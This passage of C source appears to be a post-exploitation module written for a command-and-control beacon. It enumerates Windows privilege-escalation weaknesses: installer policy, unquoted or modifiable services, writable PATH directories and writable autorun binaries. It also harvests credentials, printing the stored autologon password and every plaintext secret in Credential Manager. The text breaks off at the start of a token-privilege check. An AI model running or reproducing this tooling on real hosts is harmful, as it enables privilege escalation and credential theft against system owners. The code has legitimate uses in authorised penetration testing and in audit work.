#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

/* =================================================================
   1. AlwaysInstallElevated  (original: src/AlwaysInstallElevatedCheck)
   ================================================================= */
DWORD CheckAlwaysInstallElevated(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HKEY hKey = NULL;
    DWORD dwValue = 0;
    DWORD dwSize = sizeof(DWORD);
    BOOL bHkcuSet = FALSE;
    BOOL bHklmSet = FALSE;
    LONG lResult = 0;

    lResult = ADVAPI32$RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Policies\\Microsoft\\Windows\\Installer",
        0,
        KEY_QUERY_VALUE,
        &hKey
    );

    if (lResult == ERROR_SUCCESS)
    {
        dwSize = sizeof(DWORD);
        lResult = ADVAPI32$RegQueryValueExA(
            hKey,
            "AlwaysInstallElevated",
            NULL,
            NULL,
            (LPBYTE)&dwValue,
            &dwSize
        );

        if (lResult == ERROR_SUCCESS && dwValue == 1)
        {
            bHkcuSet = TRUE;
            internal_printf("[*] HKCU\\...\\Installer\\AlwaysInstallElevated = 1\n");
        }
        else
        {
            internal_printf("[*] HKCU\\...\\Installer\\AlwaysInstallElevated not set or != 1\n");
        }

        ADVAPI32$RegCloseKey(hKey);
        hKey = NULL;
    }
    else
    {
        internal_printf("[*] HKCU\\...\\Installer key not found\n");
    }

    lResult = ADVAPI32$RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "Software\\Policies\\Microsoft\\Windows\\Installer",
        0,
        KEY_QUERY_VALUE,
        &hKey
    );

    if (lResult == ERROR_SUCCESS)
    {
        dwSize = sizeof(DWORD);
        lResult = ADVAPI32$RegQueryValueExA(
            hKey,
            "AlwaysInstallElevated",
            NULL,
            NULL,
            (LPBYTE)&dwValue,
            &dwSize
        );

        if (lResult == ERROR_SUCCESS && dwValue == 1)
        {
            bHklmSet = TRUE;
            internal_printf("[*] HKLM\\...\\Installer\\AlwaysInstallElevated = 1\n");
        }
        else
        {
            internal_printf("[*] HKLM\\...\\Installer\\AlwaysInstallElevated not set or != 1\n");
        }

        ADVAPI32$RegCloseKey(hKey);
        hKey = NULL;
    }
    else
    {
        internal_printf("[*] HKLM\\...\\Installer key not found\n");
    }

    internal_printf("\n");
    if (bHkcuSet && bHklmSet)
    {
        internal_printf("[+] VULNERABLE: AlwaysInstallElevated is set in both HKCU and HKLM\n");
    }
    else
    {
        internal_printf("[-] NOT VULNERABLE: AlwaysInstallElevated requires both HKCU and HKLM set to 1\n");
    }

    return dwErrorCode;
}

/* =================================================================
   2. UnquotedSVCPathCheck  (original: src/UnquotedSVCPathCheck)
   ================================================================= */
DWORD UnquotedSVCPathCheck(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HKEY hServicesKey = NULL;
    HKEY hServiceKey = NULL;
    char szServiceName[256];
    char szImagePath[512];
    DWORD dwIndex = 0;
    DWORD dwNameSize = 0;
    DWORD dwValueSize = 0;
    LONG lResult = 0;
    int nFound = 0;
    int i = 0;
    int len = 0;
    BOOL bHasSpace = FALSE;
    BOOL bHasQuote = FALSE;
    BOOL bIsSystem = FALSE;
    BOOL bIsSysDriver = FALSE;
    char c;

    internal_printf("=== Unquoted Service Path Check ===\n\n");

    lResult = ADVAPI32$RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services",
        0,
        KEY_READ,
        &hServicesKey);

    if (lResult != ERROR_SUCCESS)
    {
        internal_printf("[!] Failed to open Services registry key. Error: %ld\n", lResult);
        dwErrorCode = (DWORD)lResult;
        goto UnquotedSVCPathCheck_end;
    }

    dwIndex = 0;
    while (1)
    {
        dwNameSize = sizeof(szServiceName);
        lResult = ADVAPI32$RegEnumKeyExA(
            hServicesKey,
            dwIndex,
            szServiceName,
            &dwNameSize,
            NULL,
            NULL,
            NULL,
            NULL);

        if (lResult != ERROR_SUCCESS)
        {
            break;
        }

        dwIndex++;

        lResult = ADVAPI32$RegOpenKeyExA(
            hServicesKey,
            szServiceName,
            0,
            KEY_READ,
            &hServiceKey);

        if (lResult != ERROR_SUCCESS)
        {
            continue;
        }

        dwValueSize = sizeof(szImagePath) - 1;
        lResult = ADVAPI32$RegGetValueA(
            hServiceKey,
            NULL,
            "ImagePath",
            RRF_RT_REG_SZ | RRF_RT_REG_EXPAND_SZ,
            NULL,
            szImagePath,
            &dwValueSize);

        ADVAPI32$RegCloseKey(hServiceKey);
        hServiceKey = NULL;

        if (lResult != ERROR_SUCCESS)
        {
            continue;
        }

        szImagePath[dwValueSize] = '\0';

        bHasSpace = FALSE;
        bHasQuote = FALSE;
        bIsSystem = FALSE;
        bIsSysDriver = FALSE;
        len = 0;

        for (i = 0; szImagePath[i] != '\0'; i++)
        {
            if (szImagePath[i] == ' ')
            {
                bHasSpace = TRUE;
            }
            if (szImagePath[i] == '"')
            {
                bHasQuote = TRUE;
            }
            len++;
        }

        for (i = 0; i < len - 6; i++)
        {
            c = szImagePath[i];
            if (c >= 'A' && c <= 'Z') c += 32;

            if (c == 's')
            {
                char c2 = szImagePath[i + 1];
                char c3 = szImagePath[i + 2];
                if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                if (c3 >= 'A' && c3 <= 'Z') c3 += 32;

                if (c2 == 'y' && c3 == 's')
                {
                    bIsSystem = TRUE;
                    break;
                }
            }
        }

        if (len >= 4)
        {
            char e1 = szImagePath[len - 4];
            char e2 = szImagePath[len - 3];
            char e3 = szImagePath[len - 2];
            char e4 = szImagePath[len - 1];

            if (e1 >= 'A' && e1 <= 'Z') e1 += 32;
            if (e2 >= 'A' && e2 <= 'Z') e2 += 32;
            if (e3 >= 'A' && e3 <= 'Z') e3 += 32;
            if (e4 >= 'A' && e4 <= 'Z') e4 += 32;

            if (e1 == '.' && e2 == 's' && e3 == 'y' && e4 == 's')
            {
                bIsSysDriver = TRUE;
            }
        }

        if (bHasSpace && !bHasQuote && !bIsSystem && !bIsSysDriver)
        {
            internal_printf("[+] VULNERABLE: %s\n", szServiceName);
            internal_printf("    ImagePath: %s\n\n", szImagePath);
            nFound++;
        }
    }

    internal_printf("[*] Scan complete\n");

    if (nFound > 0)
    {
        internal_printf("[+] VULNERABLE: %d unquoted service path(s) found!\n", nFound);
    }
    else
    {
        internal_printf("[-] Not Vulnerable: No unquoted service paths found\n");
    }

UnquotedSVCPathCheck_end:
    if (hServiceKey != NULL)
    {
        ADVAPI32$RegCloseKey(hServiceKey);
    }
    if (hServicesKey != NULL)
    {
        ADVAPI32$RegCloseKey(hServicesKey);
    }

    return dwErrorCode;
}

/* =================================================================
   3. ModifiableSVCCheck  (original: src/ModifiableSVCCheck)
   ================================================================= */
BOOL CheckSidInToken(HANDLE hToken, PSID pSid)
{
    BOOL bIsMember = FALSE;
    (void)hToken;

    /* CheckTokenMembership requires an impersonation token; passing a primary
       token (what OpenProcessToken returns) silently returns FALSE for group
       SIDs on many builds. Passing NULL makes the API use the thread's
       impersonation token, or auto-duplicate the primary token if the thread
       isn't impersonating — the safe path for a BOF. */
    if (ADVAPI32$CheckTokenMembership(NULL, pSid, &bIsMember))
    {
        return bIsMember;
    }

    return FALSE;
}

BOOL HasModifyRights(ACCESS_MASK mask)
{
    /* Any single write-like bit is enough to modify the service. */
    if (mask & SERVICE_CHANGE_CONFIG)                       return TRUE;
    if (mask & WRITE_DAC)                                   return TRUE;
    if (mask & WRITE_OWNER)                                 return TRUE;
    if (mask & GENERIC_ALL)                                 return TRUE;
    if (mask & GENERIC_WRITE)                               return TRUE;
    /* SERVICE_ALL_ACCESS is a COMBINED mask; require every bit to be set,
       otherwise this fires on any ACE that grants even QueryConfig or
       ReadControl (which is basically every default service ACE). */
    if ((mask & SERVICE_ALL_ACCESS) == SERVICE_ALL_ACCESS)  return TRUE;

    return FALSE;
}

const char* GetServiceState(DWORD state)
{
    switch (state)
    {
        case SERVICE_STOPPED:          return "Stopped";
        case SERVICE_START_PENDING:    return "StartPending";
        case SERVICE_STOP_PENDING:     return "StopPending";
        case SERVICE_RUNNING:          return "Running";
        case SERVICE_CONTINUE_PENDING: return "ContinuePending";
        case SERVICE_PAUSE_PENDING:    return "PausePending";
        case SERVICE_PAUSED:           return "Paused";
        default:                       return "Unknown";
    }
}

const char* GetStartType(DWORD startType)
{
    switch (startType)
    {
        case SERVICE_BOOT_START:   return "Boot";
        case SERVICE_SYSTEM_START: return "System";
        case SERVICE_AUTO_START:   return "Auto";
        case SERVICE_DEMAND_START: return "Manual";
        case SERVICE_DISABLED:     return "Disabled";
        default:                   return "Unknown";
    }
}

DWORD ModifiableSVCCheck(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    HANDLE hToken = NULL;
    HANDLE hHeap = NULL;
    LPBYTE pServices = NULL;
    LPENUM_SERVICE_STATUS_PROCESSA pServiceStatus = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    LPQUERY_SERVICE_CONFIGA pConfig = NULL;
    PTOKEN_USER pTokenUser = NULL;
    DWORD dwBytesNeeded = 0;
    DWORD dwServicesReturned = 0;
    DWORD dwResumeHandle = 0;
    DWORD dwBufferSize = 0;
    DWORD dwSDSize = 0;
    DWORD dwConfigSize = 0;
    DWORD dwTokenInfoSize = 0;
    DWORD i = 0;
    DWORD j = 0;
    int nVulnerable = 0;
    BOOL bDaclPresent = FALSE;
    BOOL bDaclDefaulted = FALSE;
    PACL pDacl = NULL;
    PACE_HEADER pAceHeader = NULL;
    PACCESS_ALLOWED_ACE pAce = NULL;
    PSID pAceSid = NULL;

    hHeap = KERNEL32$GetProcessHeap();

    internal_printf("=== Modifiable Services Check ===\n\n");

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to open process token. Error: %lu\n", dwErrorCode);
        goto ModifiableSVCCheck_end;
    }

    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &dwTokenInfoSize);
    pTokenUser = (PTOKEN_USER)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwTokenInfoSize);
    if (pTokenUser == NULL)
    {
        dwErrorCode = ERROR_NOT_ENOUGH_MEMORY;
        internal_printf("[!] Failed to allocate memory for token user\n");
        goto ModifiableSVCCheck_end;
    }

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, dwTokenInfoSize, &dwTokenInfoSize))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to get token user. Error: %lu\n", dwErrorCode);
        goto ModifiableSVCCheck_end;
    }

    hSCManager = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == NULL)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to open Service Control Manager. Error: %lu\n", dwErrorCode);
        goto ModifiableSVCCheck_end;
    }

    ADVAPI32$EnumServicesStatusExA(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_STATE_ALL,
        NULL,
        0,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        NULL);

    dwBufferSize = dwBytesNeeded;
    pServices = (LPBYTE)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
    if (pServices == NULL)
    {
        dwErrorCode = ERROR_NOT_ENOUGH_MEMORY;
        internal_printf("[!] Failed to allocate memory for services\n");
        goto ModifiableSVCCheck_end;
    }

    dwResumeHandle = 0;
    if (!ADVAPI32$EnumServicesStatusExA(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_STATE_ALL,
        pServices,
        dwBufferSize,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        NULL))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to enumerate services. Error: %lu\n", dwErrorCode);
        goto ModifiableSVCCheck_end;
    }

    internal_printf("[*] Checking %lu services...\n\n", dwServicesReturned);

    pServiceStatus = (LPENUM_SERVICE_STATUS_PROCESSA)pServices;

    for (i = 0; i < dwServicesReturned; i++)
    {
        hService = ADVAPI32$OpenServiceA(hSCManager, pServiceStatus[i].lpServiceName, READ_CONTROL | SERVICE_QUERY_CONFIG);
        if (hService == NULL)
        {
            continue;
        }

        dwSDSize = 0;
        ADVAPI32$QueryServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, NULL, 0, &dwSDSize);
        if (dwSDSize == 0)
        {
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        pSD = (PSECURITY_DESCRIPTOR)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSDSize);
        if (pSD == NULL)
        {
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        if (!ADVAPI32$QueryServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, pSD, dwSDSize, &dwSDSize))
        {
            KERNEL32$HeapFree(hHeap, 0, pSD);
            pSD = NULL;
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        pDacl = NULL;
        if (!ADVAPI32$GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted))
        {
            KERNEL32$HeapFree(hHeap, 0, pSD);
            pSD = NULL;
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        if (!bDaclPresent || pDacl == NULL)
        {
            KERNEL32$HeapFree(hHeap, 0, pSD);
            pSD = NULL;
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        for (j = 0; j < pDacl->AceCount; j++)
        {
            if (!ADVAPI32$GetAce(pDacl, j, (LPVOID*)&pAceHeader))
            {
                continue;
            }

            if (pAceHeader->AceType != ACCESS_ALLOWED_ACE_TYPE)
            {
                continue;
            }

            pAce = (PACCESS_ALLOWED_ACE)pAceHeader;
            pAceSid = (PSID)&pAce->SidStart;

            if (!HasModifyRights(pAce->Mask))
            {
                continue;
            }

            if (ADVAPI32$EqualSid(pAceSid, pTokenUser->User.Sid) || CheckSidInToken(hToken, pAceSid))
            {
                dwConfigSize = 0;
                ADVAPI32$QueryServiceConfigA(hService, NULL, 0, &dwConfigSize);
                if (dwConfigSize > 0)
                {
                    pConfig = (LPQUERY_SERVICE_CONFIGA)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwConfigSize);
                    if (pConfig != NULL)
                    {
                        if (ADVAPI32$QueryServiceConfigA(hService, pConfig, dwConfigSize, &dwConfigSize))
                        {
                            internal_printf("[+] VULNERABLE: %s\n", pServiceStatus[i].lpServiceName);
                            internal_printf("    Display Name: %s\n", pConfig->lpDisplayName ? pConfig->lpDisplayName : "N/A");
                            internal_printf("    State: %s\n", GetServiceState(pServiceStatus[i].ServiceStatusProcess.dwCurrentState));
                            internal_printf("    Start Type: %s\n", GetStartType(pConfig->dwStartType));
                            internal_printf("    Binary Path: %s\n\n", pConfig->lpBinaryPathName ? pConfig->lpBinaryPathName : "N/A");

                            nVulnerable++;
                        }
                        KERNEL32$HeapFree(hHeap, 0, pConfig);
                        pConfig = NULL;
                    }
                }
                break;
            }
        }

        KERNEL32$HeapFree(hHeap, 0, pSD);
        pSD = NULL;
        ADVAPI32$CloseServiceHandle(hService);
        hService = NULL;
    }

    if (nVulnerable > 0)
    {
        internal_printf("[+] Found %d modifiable service(s)!\n", nVulnerable);
    }
    else
    {
        internal_printf("[-] No modifiable services found\n");
    }

    dwErrorCode = ERROR_SUCCESS;

ModifiableSVCCheck_end:
    if (pConfig != NULL)
    {
        KERNEL32$HeapFree(hHeap, 0, pConfig);
    }
    if (pSD != NULL)
    {
        KERNEL32$HeapFree(hHeap, 0, pSD);
    }
    if (pServices != NULL)
    {
        KERNEL32$HeapFree(hHeap, 0, pServices);
    }
    if (pTokenUser != NULL)
    {
        KERNEL32$HeapFree(hHeap, 0, pTokenUser);
    }
    if (hService != NULL)
    {
        ADVAPI32$CloseServiceHandle(hService);
    }
    if (hSCManager != NULL)
    {
        ADVAPI32$CloseServiceHandle(hSCManager);
    }
    if (hToken != NULL)
    {
        KERNEL32$CloseHandle(hToken);
    }

    return dwErrorCode;
}

/* =================================================================
   4. AutoLogonCheck  (original: src/AutoLogonCheck)
   ================================================================= */
DWORD CheckAutologonCredentials(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HKEY hKey = NULL;
    DWORD dwSize = 0;
    DWORD dwType = 0;
    char szAutoLogon[16] = {0};
    char szUserName[256] = {0};
    char szDomain[256] = {0};
    char szPassword[256] = {0};
    BOOL bAutoLogonFound = FALSE;
    BOOL bUserNameFound = FALSE;
    BOOL bDomainFound = FALSE;
    BOOL bPasswordFound = FALSE;
    LONG lResult = 0;

    lResult = ADVAPI32$RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0,
        KEY_READ,
        &hKey
    );

    if (lResult != ERROR_SUCCESS)
    {
        internal_printf("[!] Failed to open Winlogon registry key (error: 0x%lX)\n", lResult);
        dwErrorCode = lResult;
        goto CheckAutologonCredentials_end;
    }

    dwSize = sizeof(szAutoLogon);
    lResult = ADVAPI32$RegQueryValueExA(
        hKey,
        "AutoAdminLogon",
        NULL,
        &dwType,
        (LPBYTE)szAutoLogon,
        &dwSize
    );
    if (lResult == ERROR_SUCCESS)
    {
        internal_printf("[*] AutoAdminLogon: %s\n", szAutoLogon);
        bAutoLogonFound = TRUE;
    }

    dwSize = sizeof(szDomain);
    lResult = ADVAPI32$RegQueryValueExA(
        hKey,
        "DefaultDomainName",
        NULL,
        &dwType,
        (LPBYTE)szDomain,
        &dwSize
    );
    if (lResult == ERROR_SUCCESS && szDomain[0] != '\0')
    {
        internal_printf("[*] DefaultDomainName: %s\n", szDomain);
        bDomainFound = TRUE;
    }

    dwSize = sizeof(szUserName);
    lResult = ADVAPI32$RegQueryValueExA(
        hKey,
        "DefaultUserName",
        NULL,
        &dwType,
        (LPBYTE)szUserName,
        &dwSize
    );
    if (lResult == ERROR_SUCCESS)
    {
        internal_printf("[*] DefaultUserName: %s\n", szUserName);
        bUserNameFound = TRUE;
    }

    dwSize = sizeof(szPassword);
    lResult = ADVAPI32$RegQueryValueExA(
        hKey,
        "DefaultPassword",
        NULL,
        &dwType,
        (LPBYTE)szPassword,
        &dwSize
    );
    if (lResult == ERROR_SUCCESS)
    {
        internal_printf("[+] DefaultPassword: %s\n", szPassword);
        bPasswordFound = TRUE;
    }

    if (!bAutoLogonFound)
    {
        internal_printf("[-] AutoAdminLogon: Not Found\n");
    }
    if (!bUserNameFound)
    {
        internal_printf("[-] DefaultUserName: Not Found\n");
    }
    if (!bPasswordFound)
    {
        internal_printf("[-] DefaultPassword: Not Found\n");
    }

    internal_printf("\n");
    if (bAutoLogonFound && szAutoLogon[0] == '1' && bPasswordFound)
    {
        internal_printf("[+] VULNERABLE: Autologon credentials stored in registry!\n");
        if (bDomainFound)
        {
            internal_printf("[+] Credentials: %s\\%s:%s\n", szDomain, szUserName, szPassword);
        }
        else
        {
            internal_printf("[+] Credentials: %s:%s\n", szUserName, szPassword);
        }
    }
    else if (bAutoLogonFound && szAutoLogon[0] == '1')
    {
        internal_printf("[*] AutoAdminLogon enabled but no DefaultPassword found\n");
        internal_printf("[*] Password may be stored in LSA secrets (use lsadump)\n");
    }
    else
    {
        internal_printf("[-] Not vulnerable: Autologon not enabled or no credentials stored\n");
    }

CheckAutologonCredentials_end:
    if (hKey != NULL)
    {
        ADVAPI32$RegCloseKey(hKey);
        hKey = NULL;
    }

    return dwErrorCode;
}

/* =================================================================
   5. CredentialManagerCheck  (original: src/CredentialManagerCheck)
   ================================================================= */
#ifndef CRED_TYPE_GENERIC
#define CRED_TYPE_GENERIC                   1
#endif
#ifndef CRED_TYPE_DOMAIN_PASSWORD
#define CRED_TYPE_DOMAIN_PASSWORD           2
#endif
#ifndef CRED_TYPE_DOMAIN_CERTIFICATE
#define CRED_TYPE_DOMAIN_CERTIFICATE        3
#endif
#ifndef CRED_TYPE_DOMAIN_VISIBLE_PASSWORD
#define CRED_TYPE_DOMAIN_VISIBLE_PASSWORD   4
#endif

const char* GetCredentialTypeString(DWORD dwType)
{
    switch (dwType)
    {
        case CRED_TYPE_GENERIC:                 return "Generic";
        case CRED_TYPE_DOMAIN_PASSWORD:         return "Domain Password";
        case CRED_TYPE_DOMAIN_CERTIFICATE:      return "Domain Certificate";
        case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return "Domain Visible Password";
        case 5:                                 return "Generic Certificate";
        case 6:                                 return "Domain Extended";
        default:                                return "Unknown";
    }
}

const char* GetCredentialPersistString(DWORD dwPersist)
{
    switch (dwPersist)
    {
        case 1:  return "Session";
        case 2:  return "Local Machine";
        case 3:  return "Enterprise";
        default: return "Unknown";
    }
}

DWORD CredentialManagerCheck(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    DWORD dwCount = 0;
    PCREDENTIALA *pCredentials = NULL;
    DWORD i = 0;

    internal_printf("=== Credential Manager Check ===\n\n");

    if (!ADVAPI32$CredEnumerateA(NULL, 0, &dwCount, &pCredentials))
    {
        dwErrorCode = KERNEL32$GetLastError();

        if (dwErrorCode == ERROR_NOT_FOUND)
        {
            internal_printf("[-] No credentials found in Credential Manager\n");
            dwErrorCode = ERROR_SUCCESS;
            goto CredentialManagerCheck_end;
        }

        internal_printf("[!] Error enumerating credentials: 0x%lX\n", dwErrorCode);
        goto CredentialManagerCheck_end;
    }

    internal_printf("[+] Found %lu credential(s)\n\n", dwCount);

    for (i = 0; i < dwCount; i++)
    {
        internal_printf("--- Credential [%lu] ---\n", i + 1);
        internal_printf("  Type:    %s (%lu)\n",
            GetCredentialTypeString(pCredentials[i]->Type),
            pCredentials[i]->Type);
        internal_printf("  Persist: %s\n",
            GetCredentialPersistString(pCredentials[i]->Persist));

        if (pCredentials[i]->TargetName != NULL)
        {
            internal_printf("  Target:  %s\n", pCredentials[i]->TargetName);
        }
        else
        {
            internal_printf("  Target:  <null>\n");
        }

        if (pCredentials[i]->UserName != NULL)
        {
            internal_printf("  User:    %s\n", pCredentials[i]->UserName);
        }
        else
        {
            internal_printf("  User:    <null>\n");
        }

        if (pCredentials[i]->Comment != NULL && pCredentials[i]->Comment[0] != '\0')
        {
            internal_printf("  Comment: %s\n", pCredentials[i]->Comment);
        }

        if (pCredentials[i]->CredentialBlobSize > 0 && pCredentials[i]->CredentialBlob != NULL)
        {
            internal_printf("  Secret:  %.*s\n",
                pCredentials[i]->CredentialBlobSize,
                (char*)pCredentials[i]->CredentialBlob);
        }
        else
        {
            internal_printf("  Secret:  <empty or protected>\n");
        }

        internal_printf("\n");
    }

    internal_printf("[*] Enumeration complete: %lu credential(s) found\n", dwCount);

CredentialManagerCheck_end:
    if (pCredentials != NULL)
    {
        ADVAPI32$CredFree(pCredentials);
        pCredentials = NULL;
    }

    return dwErrorCode;
}

/* =================================================================
   6. HijackablePathCheck  (original: src/HijackablePathCheck)
   ================================================================= */
DWORD HijackablePathCheck(void)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    DWORD dwSize = 0;
    DWORD dwType = 0;
    char *szPath = NULL;
    char szDir[260];
    char szTestFile[280];
    int i, j, k;
    int nWritable = 0;
    int nChecked = 0;
    DWORD dwAttr;
    HANDLE hFile;
    HANDLE hHeap;

    internal_printf("=== Hijackable PATH Check ===\n\n");

    hHeap = KERNEL32$GetProcessHeap();
    szPath = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 4096);
    if (szPath == NULL)
    {
        internal_printf("[!] HeapAlloc failed\n");
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    lResult = ADVAPI32$RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
        0,
        KEY_READ,
        &hKey);

    if (lResult != ERROR_SUCCESS)
    {
        internal_printf("[!] RegOpenKeyExA failed: %ld\n", lResult);
        KERNEL32$HeapFree(hHeap, 0, szPath);
        return (DWORD)lResult;
    }

    dwSize = 4095;
    lResult = ADVAPI32$RegQueryValueExA(hKey, "Path", NULL, &dwType, (LPBYTE)szPath, &dwSize);
    ADVAPI32$RegCloseKey(hKey);

    if (lResult != ERROR_SUCCESS)
    {
        internal_printf("[!] RegQueryValueExA failed: %ld\n", lResult);
        KERNEL32$HeapFree(hHeap, 0, szPath);
        return (DWORD)lResult;
    }

    szPath[dwSize] = '\0';

    j = 0;
    for (i = 0; i <= (int)dwSize; i++)
    {
        if (szPath[i] == ';' || szPath[i] == '\0')
        {
            if (j > 0 && j < 260)
            {
                szDir[j] = '\0';
                nChecked++;

                dwAttr = KERNEL32$GetFileAttributesA(szDir);
                if (dwAttr != INVALID_FILE_ATTRIBUTES && (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
                {
                    for (k = 0; k < j && k < 250; k++)
                        szTestFile[k] = szDir[k];
                    szTestFile[k++] = '\\';
                    szTestFile[k++] = 'x';
                    szTestFile[k++] = '.';
                    szTestFile[k++] = 't';
                    szTestFile[k++] = 'm';
                    szTestFile[k++] = 'p';
                    szTestFile[k] = '\0';

                    hFile = KERNEL32$CreateFileA(szTestFile, GENERIC_WRITE, 0, NULL,
                        CREATE_NEW, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);

                    if (hFile != INVALID_HANDLE_VALUE)
                    {
                        KERNEL32$CloseHandle(hFile);
                        KERNEL32$DeleteFileA(szTestFile);
                        internal_printf("[+] WRITABLE: %s\n", szDir);
                        nWritable++;
                    }
                }
            }
            j = 0;
        }
        else if (j < 259)
        {
            szDir[j++] = szPath[i];
        }
    }

    KERNEL32$HeapFree(hHeap, 0, szPath);

    internal_printf("\n[*] Checked %d directories\n", nChecked);

    if (nWritable > 0)
        internal_printf("[+] VULNERABLE: %d writable path(s) found!\n", nWritable);
    else
        internal_printf("[-] Not Vulnerable: No writable paths found\n");

    return ERROR_SUCCESS;
}

/* =================================================================
   7. ModifiableAutorunCheck  (original: src/ModifiableAutorunCheck)
   ================================================================= */
DWORD ModifiableAutorunCheck(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HKEY hKey = NULL;
    LONG lResult = 0;
    char szValueName[256];
    char szValueData[512];
    char szPath[512];
    DWORD dwValueNameSize = 0;
    DWORD dwValueDataSize = 0;
    DWORD dwType = 0;
    DWORD dwIndex = 0;
    int nFound = 0;
    int i = 0;
    int k = 0;
    int p = 0;
    int q = 0;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    const char* pszHives[] = { "HKLM", "HKCU" };
    HKEY hRoots[] = { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };

    const char* pszSubkeys[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    };

    internal_printf("=== Modifiable Autorun Check ===\n\n");

    for (i = 0; i < 2; i++)
    {
        for (k = 0; k < 4; k++)
        {
            lResult = ADVAPI32$RegOpenKeyExA(
                hRoots[i],
                pszSubkeys[k],
                0,
                KEY_READ,
                &hKey);

            if (lResult != ERROR_SUCCESS)
            {
                continue;
            }

            dwIndex = 0;
            while (1)
            {
                dwValueNameSize = sizeof(szValueName);
                dwValueDataSize = sizeof(szValueData);

                lResult = ADVAPI32$RegEnumValueA(
                    hKey,
                    dwIndex,
                    szValueName,
                    &dwValueNameSize,
                    NULL,
                    &dwType,
                    (LPBYTE)szValueData,
                    &dwValueDataSize);

                if (lResult != ERROR_SUCCESS)
                {
                    break;
                }

                if (dwType == REG_SZ || dwType == REG_EXPAND_SZ)
                {
                    szValueData[dwValueDataSize] = '\0';

                    p = 0;
                    q = 0;

                    while (szValueData[p] == ' ') p++;

                    if (szValueData[p] == '"')
                    {
                        p++;
                        while (szValueData[p] != '\0' && szValueData[p] != '"' && q < 510)
                        {
                            szPath[q++] = szValueData[p++];
                        }
                    }
                    else
                    {
                        while (szValueData[p] != '\0' && szValueData[p] != ' ' && q < 510)
                        {
                            szPath[q++] = szValueData[p++];
                        }
                    }
                    szPath[q] = '\0';

                    hFile = KERNEL32$CreateFileA(
                        szPath,
                        GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);

                    if (hFile != INVALID_HANDLE_VALUE)
                    {
                        KERNEL32$CloseHandle(hFile);
                        internal_printf("[+] WRITABLE: %s\\%s\n", pszHives[i], pszSubkeys[k]);
                        internal_printf("    Name: %s\n", szValueName);
                        internal_printf("    Path: %s\n\n", szValueData);
                        nFound++;
                    }
                }

                dwIndex++;
            }

            ADVAPI32$RegCloseKey(hKey);
            hKey = NULL;
        }
    }

    internal_printf("[*] Scan complete\n");

    if (nFound > 0)
    {
        internal_printf("[+] VULNERABLE: %d modifiable autorun(s) found!\n", nFound);
    }
    else
    {
        internal_printf("[-] Not Vulnerable: No modifiable autoruns found\n");
    }

    return dwErrorCode;
}

/* =================================================================
   8. TokenPrivilegesCheck  (original: src/TokenPrivilegesCheck)
   ================================================================= */
DWORD TokenPrivilegesCheck(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HANDLE hToken = NULL;
